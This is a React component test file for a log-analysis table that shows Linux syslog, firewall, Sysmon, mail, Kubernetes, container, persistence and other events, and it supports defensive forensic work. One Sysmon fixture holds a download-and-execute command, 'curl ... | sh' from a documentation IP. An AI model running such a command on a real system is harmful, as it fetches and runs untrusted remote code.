import { fireEvent, render, screen, within } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import EventTable from "./EventTable";

vi.mock("../context/TimezoneContext", () => ({ useTimezonePreference: () => ({ effectiveTimezone: "UTC" }) }));
vi.mock("../lib/time", async () => ({ ...(await vi.importActual<typeof import("../lib/time")>("../lib/time")), copyToClipboard: vi.fn() }));

type Item = Record<string, unknown>;

const row = (type: string, extra: Item): Item => ({
  id: `${type}-row`,
  "@timestamp": "2024-03-01T10:20:30Z",
  artifact: { type, family: type, parser: `${type}_raw` },
  host: { name: "web01" },
  ...extra,
});

const headers = () => screen.getAllByRole("columnheader").map((header) => header.textContent ?? "");

describe("Linux log tables: syslog", () => {
  const item = row("linux_syslog", {
    event: { type: "syslog", severity: "medium", message: "Out of memory: Killed process 4242 (mysqld)" },
    message: "Out of memory: Killed process 4242 (mysqld)",
    linux: { process: "kernel", pid: 0, line_number: 3 },
  });

  it("shows the message, which the network view alone never had", () => {
    render(<EventTable items={[item]} view="network" />);
    expect(screen.getByRole("columnheader", { name: /Message/i })).toBeInTheDocument();
    expect(screen.getByText("Out of memory: Killed process 4242 (mysqld)")).toBeInTheDocument();
    expect(screen.getByRole("columnheader", { name: /Process/i })).toBeInTheDocument();
    expect(screen.getByText("medium")).toBeInTheDocument();
  });

  it("keeps secondary fields in the column chooser instead of the table", () => {
    render(<EventTable items={[item]} view="network" />);
    expect(screen.queryByRole("columnheader", { name: /Source File/i })).not.toBeInTheDocument();
    expect(screen.queryByRole("columnheader", { name: /Time Quality/i })).not.toBeInTheDocument();
  });
});

describe("Linux log tables: firewall", () => {
  const block = row("linux_syslog", {
    event: { type: "syslog", action: "firewall_block", outcome: "failure", severity: "low", message: "[UFW BLOCK] IN=eth0 SRC=203.0.113.9 DST=192.0.2.10 PROTO=TCP SPT=51234 DPT=22" },
    message: "[UFW BLOCK] IN=eth0 SRC=203.0.113.9 DST=192.0.2.10 PROTO=TCP SPT=51234 DPT=22",
    title: "Firewall block: 203.0.113.9:51234 -> 192.0.2.10:22 (tcp)",
    network: { source_ip: "203.0.113.9", source_port: 51234, destination_ip: "192.0.2.10", destination_port: 22, protocol: "tcp" },
    linux: { firewall_action: "block", network_protocol: "tcp", interface_in: "eth0", firewall_prefix: "[UFW BLOCK]" },
  });

  it("switches to packet columns when the rows are packet logs", () => {
    render(<EventTable items={[block]} view="network" />);
    for (const name of [/Verdict/, /Proto/, /Source IP/, /Destination IP/, /Dst Port/, /Message/]) {
      expect(screen.getByRole("columnheader", { name })).toBeInTheDocument();
    }
    expect(screen.getByText("block")).toBeInTheDocument();
    expect(screen.getByText("203.0.113.9")).toBeInTheDocument();
    expect(screen.getByText("192.0.2.10")).toBeInTheDocument();
    expect(screen.getByText("22")).toBeInTheDocument();
    expect(screen.getByText(/\[UFW BLOCK\] IN=eth0/)).toBeInTheDocument();
  });

  it("opens a Firewall packet detail section", () => {
    render(<EventTable items={[block]} view="network" />);
    fireEvent.click(screen.getByText("203.0.113.9"));
    expect(screen.getByText("Firewall packet")).toBeInTheDocument();
    expect(screen.getByText("Log prefix")).toBeInTheDocument();
  });

  it("offers filter and exclude on the source address and the verdict", () => {
    const onFilterField = vi.fn();
    const onExcludeField = vi.fn();
    render(<EventTable items={[block]} view="network" onFilterField={onFilterField} onExcludeField={onExcludeField} />);
    fireEvent.click(screen.getByRole("button", { name: "Pivot Source IP" }));
    fireEvent.click(screen.getByRole("button", { name: "Filter by Source IP" }));
    expect(onFilterField).toHaveBeenCalledWith("ip", "203.0.113.9");
    fireEvent.click(screen.getByRole("button", { name: "Pivot Verdict" }));
    fireEvent.click(screen.getByRole("button", { name: "Exclude Verdict" }));
    expect(onExcludeField).toHaveBeenCalledWith("verdict", "block");
  });
});

describe("Linux log tables: Sysmon for Linux", () => {
  const process = row("linux_syslog", {
    event: { type: "sysmon_process_created", code: "1", severity: "info", message: "Process created: curl -s http://203.0.113.9/x | sh (parent /bin/bash)" },
    message: "Process created: curl -s http://203.0.113.9/x | sh (parent /bin/bash)",
    user: { name: "root" },
    process: { name: "curl", path: "/usr/bin/curl", command_line: "curl -s http://203.0.113.9/x | sh", parent_path: "/bin/bash", parent_command_line: "bash -i", pid: 1234, ppid: 1000 },
    linux: { sysmon_event_id: 1, exe: "/usr/bin/curl" },
  });

  it("shows the process, command line and parent instead of an XML blob", () => {
    render(<EventTable items={[process]} view="network" />);
    for (const name of [/^Event/, /User/, /Image/, /Command Line/, /Parent Image/, /Message/]) {
      expect(screen.getAllByRole("columnheader", { name }).length).toBeGreaterThan(0);
    }
    expect(screen.getByText("Process created", { selector: "td *" })).toBeInTheDocument();
    expect(screen.getByText("/usr/bin/curl")).toBeInTheDocument();
    expect(screen.getByText("/bin/bash")).toBeInTheDocument();
  });

  it("opens a Sysmon event section and offers a pivot on the image", () => {
    const onFilterField = vi.fn();
    render(<EventTable items={[process]} view="network" onFilterField={onFilterField} />);
    fireEvent.click(screen.getByRole("button", { name: "Pivot Image" }));
    fireEvent.click(screen.getByRole("button", { name: "Filter by Image" }));
    expect(onFilterField).toHaveBeenCalledWith("exe", "/usr/bin/curl");
    fireEvent.click(screen.getByText("/bin/bash"));
    expect(screen.getByText("Sysmon event")).toBeInTheDocument();
    expect(screen.getByText("Parent command line")).toBeInTheDocument();
  });
});

describe("Linux log tables: mail server", () => {
  const failed = row("linux_syslog", {
    event: { type: "syslog", action: "mail_auth_failed", outcome: "failure", severity: "medium", message: "imap-login: Disconnected (auth failed, 3 attempts in 4 secs): user=<bob>" },
    message: "imap-login: Disconnected (auth failed, 3 attempts in 4 secs): user=<bob>",
    user: { name: "bob" },
    network: { source_ip: "203.0.113.9" },
    linux: { mail_service: "dovecot", mail_status: "failed", process: "dovecot" },
  });

  it("shows who tried which account from where, with the original line", () => {
    render(<EventTable items={[failed]} view="network" />);
    for (const name of [/Service/, /^Action/, /Client IP/, /^User/, /Sender/, /Recipient/, /Status/, /Queue ID/, /Message/]) {
      expect(screen.getAllByRole("columnheader", { name }).length).toBeGreaterThan(0);
    }
    expect(screen.getByText("Login failed")).toBeInTheDocument();
    expect(screen.getByText("203.0.113.9")).toBeInTheDocument();
    expect(screen.getByText("dovecot")).toBeInTheDocument();
    expect(screen.getByText(/auth failed, 3 attempts/)).toBeInTheDocument();
  });

  it("pivots on the service and the status by their raw values", () => {
    const onFilterField = vi.fn();
    render(<EventTable items={[failed]} view="network" onFilterField={onFilterField} />);
    fireEvent.click(screen.getByRole("button", { name: "Pivot Service" }));
    fireEvent.click(screen.getByRole("button", { name: "Filter by Service" }));
    expect(onFilterField).toHaveBeenCalledWith("mailservice", "dovecot");
    fireEvent.click(screen.getByRole("button", { name: "Pivot Status" }));
    fireEvent.click(screen.getByRole("button", { name: "Filter by Status" }));
    expect(onFilterField).toHaveBeenCalledWith("mailstatus", "failed");
  });

  it("opens a Mail detail section", () => {
    render(<EventTable items={[failed]} view="network" />);
    fireEvent.click(screen.getByText("203.0.113.9"));
    expect(screen.getByText("Mail")).toBeInTheDocument();
    expect(screen.getByText("Authenticated user")).toBeInTheDocument();
  });
});

describe("Linux log tables: Kubernetes audit", () => {
  const exec = row("linux_k8s_audit", {
    event: { type: "k8s_audit", action: "k8s_create", outcome: "success", severity: "medium", message: "alice create pods/web/exec (namespace default) -> 101 [allow]" },
    message: "alice create pods/web/exec (namespace default) -> 101 [allow]",
    user: { name: "alice" },
    network: { source_ip: "203.0.113.9" },
    http: { response: { status_code: 101 } },
    linux: { k8s_verb: "create", k8s_resource: "pods", k8s_subresource: "exec", k8s_namespace: "default", k8s_object: "web", k8s_decision: "allow", suspicious_indicators: ["pod_exec"] },
  });

  it("shows the caller, verb, object, source and decision, with the flags", () => {
    render(<EventTable items={[exec]} view="network" />);
    for (const name of [/^User/, /Verb/, /^Resource/, /Namespace/, /Source IP/, /Decision/, /Flags/, /Message/]) {
      expect(screen.getByRole("columnheader", { name })).toBeInTheDocument();
    }
    expect(screen.getByText("pod_exec")).toBeInTheDocument();
    expect(screen.getByText("web")).toBeInTheDocument();
  });

  it("pivots on the verb and the namespace by their exact values", () => {
    const onFilterField = vi.fn();
    render(<EventTable items={[exec]} view="network" onFilterField={onFilterField} />);
    fireEvent.click(screen.getByRole("button", { name: "Pivot Verb" }));
    fireEvent.click(screen.getByRole("button", { name: "Filter by Verb" }));
    expect(onFilterField).toHaveBeenCalledWith("verb", "create");
    fireEvent.click(screen.getByRole("button", { name: "Pivot Namespace" }));
    fireEvent.click(screen.getByRole("button", { name: "Filter by Namespace" }));
    expect(onFilterField).toHaveBeenCalledWith("namespace", "default");
  });

  it("opens a Kubernetes request detail section", () => {
    render(<EventTable items={[exec]} view="network" />);
    fireEvent.click(screen.getByText("web"));
    expect(screen.getByText("Kubernetes request")).toBeInTheDocument();
    expect(screen.getByText("Authorization decision")).toBeInTheDocument();
  });
});

describe("Linux log tables: containers", () => {
  const log = row("linux_container", {
    event: { type: "container_log", action: "container_stderr", severity: "medium", message: "db connection refused" },
    message: "db connection refused",
    linux: { container_name: "api", container_id: "a1b2c3d4", k8s_pod: "api-7d9", k8s_namespace: "shop", container_stream: "stderr" },
  });
  const config = row("linux_container", {
    event: { type: "container_hostconfig", severity: "high", message: "Container host configuration a1b2c3d4: NetworkMode=host [privileged_container]" },
    message: "Container host configuration a1b2c3d4: NetworkMode=host [privileged_container]",
    linux: { container_id: "a1b2c3d4", container_privileged: true, network_mode: "host", suspicious_indicators: ["privileged_container", "host_network"] },
  });

  it("shows a container's output with its pod, namespace and stream, and the message", () => {
    render(<EventTable items={[log]} view="network" />);
    for (const name of [/Container/, /Pod/, /Namespace/, /Stream/, /Message/]) {
      expect(screen.getAllByRole("columnheader", { name }).length).toBeGreaterThan(0);
    }
    expect(screen.getByText("db connection refused")).toBeInTheDocument();
    expect(screen.getByText("api-7d9")).toBeInTheDocument();
    expect(screen.getByText("stderr")).toBeInTheDocument();
  });

  it("pivots on the pod, namespace and stream by their exact values", () => {
    const onFilterField = vi.fn();
    render(<EventTable items={[log]} view="network" onFilterField={onFilterField} />);
    for (const [label, field, value] of [["Pod", "pod", "api-7d9"], ["Namespace", "namespace", "shop"], ["Stream", "stream", "stderr"]]) {
      fireEvent.click(screen.getByRole("button", { name: `Pivot ${label}` }));
      fireEvent.click(screen.getByRole("button", { name: `Filter by ${label}` }));
      expect(onFilterField).toHaveBeenCalledWith(field, value);
    }
  });

  it("shows container configuration with its flags and a privileged answer, not log columns", () => {
    render(<EventTable items={[config]} view="network" />);
    expect(screen.getByRole("columnheader", { name: /Privileged/i })).toBeInTheDocument();
    expect(screen.getByRole("columnheader", { name: /Flags/i })).toBeInTheDocument();
    expect(screen.queryByRole("columnheader", { name: /Stream/i })).not.toBeInTheDocument();
    expect(screen.getByText("privileged_container, host_network")).toBeInTheDocument();
    expect(screen.getByText("yes")).toBeInTheDocument();
    expect(screen.getByText("Host configuration")).toBeInTheDocument();
  });

  it("states in the detail that environment values are never stored", () => {
    render(<EventTable items={[row("linux_container", { ...config, id: "cfg-2", linux: { ...(config.linux as object), container_env_names: ["PATH", "DB_PASSWORD"] } })]} view="network" />);
    fireEvent.click(screen.getByText("yes"));
    expect(screen.getByText("Environment variable names (values are never stored)")).toBeInTheDocument();
    expect(screen.getByText("PATH, DB_PASSWORD")).toBeInTheDocument();
  });
});

describe("Linux log tables: systemd journal", () => {
  const item = row("linux_journal", {
    event: { type: "linux_journal", action: "ssh.service", severity: "medium", message: "Failed password for invalid user mallory" },
    message: "Failed password for invalid user mallory",
    user: { id: "0", name: "root" },
    linux: { unit: "ssh.service", process: "sshd", pid: 411, exe: "/usr/sbin/sshd" },
  });

  it("gets the journal layout even though the registry files it under the evtx view", () => {
    render(<EventTable items={[item]} view="evtx" />);
    expect(screen.getByRole("columnheader", { name: /Unit/i })).toBeInTheDocument();
    expect(screen.getByRole("columnheader", { name: /Message/i })).toBeInTheDocument();
    expect(screen.queryByRole("columnheader", { name: /Event ID/i })).not.toBeInTheDocument();
    expect(screen.getByText("ssh.service")).toBeInTheDocument();
    expect(screen.getByText("Failed password for invalid user mallory")).toBeInTheDocument();
  });
});

describe("Linux log tables: generic text log", () => {
  const item = row("linux_generic_log", {
    event: { type: "generic_log", severity: "medium", message: "upstream timed out while reading response header" },
    message: "upstream timed out while reading response header",
    linux: { process: "app", log_format: "iso", timestamp_status: "assumed_utc", line_number: 12 },
  });

  it("always shows the message and flags the assumed time", () => {
    render(<EventTable items={[item]} view="network" />);
    expect(screen.getByRole("columnheader", { name: /Message/i })).toBeInTheDocument();
    expect(screen.getByText("upstream timed out while reading response header")).toBeInTheDocument();
    expect(screen.getByRole("columnheader", { name: /Time Quality/i })).toBeInTheDocument();
    expect(screen.getByText(/Assumed UTC/)).toBeInTheDocument();
  });

  it("shows the message even for a line the parser could extract nothing else from", () => {
    const bare = row("linux_generic_log", { event: { message: "starting worker" }, message: "starting worker", linux: { log_format: "none", timestamp_status: "missing" } });
    render(<EventTable items={[bare]} view="network" />);
    expect(screen.getByText("starting worker")).toBeInTheDocument();
    expect(screen.getByText("No time in the log")).toBeInTheDocument();
  });
});

describe("Linux log tables: persistence and fail2ban", () => {
  it("lists a preloaded library with its flags rather than blank scheduled-task columns", () => {
    const item = row("linux_persistence", {
      event: { type: "ld_so_preload", severity: "high", message: "/dev/shm/.hook.so" },
      message: "/dev/shm/.hook.so",
      source_file: "etc/ld.so.preload",
      linux: { library_path: "/dev/shm/.hook.so", suspicious_indicators: ["preload_library", "unusual_preload_path"], line_number: 1 },
    });
    render(<EventTable items={[item]} view="persistence" />);
    expect(screen.getByRole("columnheader", { name: /Entry \/ Command/i })).toBeInTheDocument();
    expect(screen.getByRole("columnheader", { name: /Flags/i })).toBeInTheDocument();
    expect(screen.queryByRole("columnheader", { name: /Trigger Summary/i })).not.toBeInTheDocument();
    expect(screen.getByText("Preloaded library")).toBeInTheDocument();
    expect(screen.getByText("/dev/shm/.hook.so")).toBeInTheDocument();
    expect(screen.getByText("preload_library, unusual_preload_path")).toBeInTheDocument();
    expect(screen.getByText("etc/ld.so.preload")).toBeInTheDocument();
  });

  it("shows fail2ban bans with the jail and address", () => {
    const item = row("linux_fail2ban", {
      event: { type: "fail2ban", severity: "info", message: "[sshd] Ban 203.0.113.9" },
      message: "[sshd] Ban 203.0.113.9",
      network: { source_ip: "203.0.113.9" },
      linux: { jail: "sshd", event_action: "ban", timestamp_status: "assumed_utc" },
    });
    render(<EventTable items={[item]} view="network" />);
    expect(screen.getByRole("columnheader", { name: /Jail/i })).toBeInTheDocument();
    const cells = within(screen.getByRole("table")).getAllByRole("cell").map((cell) => cell.textContent);
    expect(cells).toEqual(expect.arrayContaining(["sshd", "Ban", "203.0.113.9"]));
  });
});

describe("Linux log tables: nothing else changed", () => {
  it("leaves tables without a Linux profile on their original columns", () => {
    render(<EventTable items={[row("evtx", { event: { type: "logon", message: "m" }, windows: { event_id: 4624 } })]} view="evtx" />);
    expect(headers().join("|")).not.toMatch(/Unit|Verdict|Message/);
  });
});

describe("Linux log tables: databases", () => {
  const item = row("linux_database", {
    event: { type: "postgres_log", action: "db_auth_failed", severity: "medium", message: "password authentication failed" },
    message: "password authentication failed",
    user: { name: "mallory" },
    network: { source_ip: "203.0.113.9" },
    linux: { db_engine: "postgresql", db_name: "app" },
  });

  it("shows who connected from where, to which database, with the message", () => {
    render(<EventTable items={[item]} view="network" />);
    for (const name of [/Engine/, /Action/, /Client IP/, /Database/, /Message/]) {
      expect(screen.getAllByRole("columnheader", { name }).length).toBeGreaterThan(0);
    }
    expect(screen.getByText("password authentication failed")).toBeInTheDocument();
    expect(screen.getByText("postgresql")).toBeInTheDocument();
  });

  it("pivots on the engine and database by their exact values", () => {
    const onFilterField = vi.fn();
    render(<EventTable items={[item]} view="network" onFilterField={onFilterField} />);
    for (const [label, field, value] of [["Engine", "dbengine", "postgresql"], ["Database", "database", "app"]]) {
      fireEvent.click(screen.getByRole("button", { name: `Pivot ${label}` }));
      fireEvent.click(screen.getByRole("button", { name: `Filter by ${label}` }));
      expect(onFilterField).toHaveBeenCalledWith(field, value);
    }
  });
});

describe("Linux log tables: VPN", () => {
  const item = row("linux_vpn", {
    event: { type: "openvpn_log", action: "vpn_auth_failed", severity: "medium", message: "TLS Auth Error" },
    message: "TLS Auth Error",
    network: { source_ip: "198.51.100.7" },
    linux: { vpn_software: "openvpn", vpn_assigned_ip: "10.8.0.6" },
  });

  it("shows the client, tunnel address and message", () => {
    render(<EventTable items={[item]} view="network" />);
    for (const name of [/VPN/, /Action/, /Client IP/, /Tunnel IP/, /Message/]) {
      expect(screen.getAllByRole("columnheader", { name }).length).toBeGreaterThan(0);
    }
    expect(screen.getByText("TLS Auth Error")).toBeInTheDocument();
  });

  it("pivots on the VPN software and the tunnel address by their exact values", () => {
    const onFilterField = vi.fn();
    render(<EventTable items={[item]} view="network" onFilterField={onFilterField} />);
    for (const [label, field, value] of [["VPN", "vpn", "openvpn"], ["Tunnel IP", "vpnip", "10.8.0.6"]]) {
      fireEvent.click(screen.getByRole("button", { name: `Pivot ${label}` }));
      fireEvent.click(screen.getByRole("button", { name: `Filter by ${label}` }));
      expect(onFilterField).toHaveBeenCalledWith(field, value);
    }
  });
});
